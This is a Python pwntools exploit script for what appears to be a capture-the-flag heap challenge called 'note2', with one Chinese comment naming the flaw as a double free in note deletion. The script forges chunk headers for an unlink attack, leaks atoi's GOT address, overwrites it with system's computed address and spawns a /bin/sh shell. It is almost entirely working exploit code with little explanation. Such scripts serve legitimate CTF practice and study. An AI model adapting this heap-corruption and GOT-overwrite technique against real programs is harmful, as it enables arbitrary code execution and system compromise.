#-* coding=utf-8 -*#
#问题出在free一个note后没有清空这个note，导致可以double free，伪造chunk头改写全局指针即可实现任意空间读写
from pwn import *

p = process( './note2' )

atoi_got = 0x602088

system_libc = 0x41490

atoi_libc = 0x362c0

context.log_level = 'debug'

def input_info( name , address ) :
    p.sendlineafter( 'Input your name:\n' , name )
    p.sendlineafter( 'Input your address:\n' , address )

def new( size , content ) :
    p.sendlineafter( 'option--->>\n' , '1' )
    p.sendlineafter( 'Input the length of the note content:(less than 128)\n' , str( size ) )
    p.sendlineafter( 'Input the note content:\n' , content )

def edit( id , mode , content ) :
    p.sendlineafter( 'option--->>\n' , '3' )
    p.sendlineafter( 'Input the id of the note:\n' , str( id ) )
    p.sendlineafter( 'do you want to overwrite or append?[1.overwrite/2.append]\n' ,str( mode ) )
    p.sendlineafter( 'TheNewContents:' , content )

def delete( id ) :
    p.sendlineafter( 'option--->>\n' , '4' )
    p.sendlineafter( 'Input the id of the note:\n', str( id ) )


def pwn ( ) :
    input_info( 'a' *16 , 'b' *16 )
    payload = p64( 0 ) + p64( 0xa1 ) + p64( 0x602120 - 0x18 )+ p64( 0x602120 -0x10 )
    new( 128, payload )
    new( 0 , '' )
    new( 128 , 'b' * 1 )
    delete( 1 )
    payload = 'a'*16 + p64( 0xa0 ) + p64( 0x90 )
    new( 0 ,payload )
    delete( 2 )
    payload = p64( 0xffffffffffffffff ) * 3 + p64( atoi_got )
    edit( 0 , 1 , payload  )
    p.sendlineafter ( 'option--->>\n' , '2')
    p.sendlineafter ( 'Input the id of the note:\n' , '0' )
    atoi_add = u64 ( p.recvline ( )[-8:].ljust( 8 , '\x00') ) - 0xa00000000000000
    atoi_add = atoi_add >> 8
    print hex ( atoi_add )
    system_add = atoi_add - atoi_libc + system_libc
    edit( 0 , 1 , p64( system_add )  )
    p.sendlineafter ( 'option--->>\n' , '/bin/sh')
    p.interactive()

if __name__ == '__main__' :
    pwn()
